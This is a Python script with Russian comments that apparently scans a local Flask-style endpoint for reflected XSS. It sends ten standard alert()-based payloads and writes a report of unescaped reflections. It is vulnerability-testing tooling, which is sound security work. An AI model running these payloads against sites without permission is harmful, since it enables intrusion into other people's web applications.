import requests
import os
from datetime import datetime
from markupsafe import escape

# Список полезных нагрузок XSS
xss_payloads = [
    "<script>alert('XSS')</script>",  # Простой скрипт
    "<img src=x onerror=alert('XSS')>",  # XSS с изображением
    "<svg/onload=alert('XSS')>",  # XSS с SVG
    "<iframe src='javascript:alert(`XSS`);'></iframe>",  # XSS через iframe
    "javascript:alert('XSS')",  # Вставка javascript
    "<body onload=alert('XSS')>",  # XSS при загрузке тела страницы
    "'\"><script>alert('XSS')</script>",  # Закрытие тегов
    "><script>alert(1)</script>",  # Некорректные символы
    "<marquee onstart=alert('XSS')>XSS</marquee>",  # XSS через marquee
    "<a href='javascript:alert(1)'>Click</a>"  # XSS через ссылку
]

# URL для тестирования
url = 'http://127.0.0.1:5000/xss'

# Параметры запроса (параметр 'input' используется для передачи полезных нагрузок)
params = {
    'input': ''
}

results = []

def test_xss_vulnerabilities(url, params, payloads):
    for payload in payloads:
        print(f'Тестирование полезной нагрузки: {payload}')
        params['input'] = payload

        try:
            response = requests.get(url, params=params)
            is_vulnerable = False

            if payload in response.text and escape(payload) not in response.text:
                is_vulnerable = True
                print(f'[!] Обнаружена уязвимость XSS: {payload}')
            else:
                print(f'[+] Не обнаружена уязвимость XSS: {payload}')

            results.append({
                'payload': payload,
                'is_vulnerable': is_vulnerable,
                'response_snippet': response.text[:200]
            })
        except requests.RequestException as e:
            print(f'Ошибка при запросе: {e}')
            results.append({
                'payload': payload,
                'is_vulnerable': False,
                'error': str(e)
            })

def generate_report(results, report_dir='Отчет'):
    os.makedirs(report_dir, exist_ok=True)

    report_filename = 'Уязвимости XSS.txt'
    report_path = os.path.join(report_dir, report_filename)

    # Анализ результатов
    total_tests = len(results)
    vulnerabilities = [r for r in results if r['is_vulnerable']]
    total_vulnerable = len(vulnerabilities)


    try:
        with open(report_path, 'w') as f:
            f.write('Отчет о тестировании XSS-атаки\n')
            f.write('=' * 40 + '\n')
            f.write(f'Дата проверки: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
            f.write(f'Всего проведено тестов: {total_tests}\n')
            f.write(f'Всего найдено уязвимостей: {total_vulnerable}\n\n')

            f.write('Подробная информация об уязвимости:\n')
            f.write('-' * 40 + '\n')
            for vuln in vulnerabilities:
                f.write(f"Полезная нагрузка: {vuln['payload']}\n")
                f.write(f"Фрагмент ответа: {vuln['response_snippet']}\n")
                f.write('-' * 40 + '\n')

            print(f'[INFO] Отчет сохранен в: {report_path}')
    except Exception as e:
        print(f'[ERROR] Ошибка при сохранении отчета: {e}')

if __name__ == '__main__':
    # Запуск тестирования
    test_xss_vulnerabilities(url, params, xss_payloads)

    # Генерация отчета
    generate_report(results)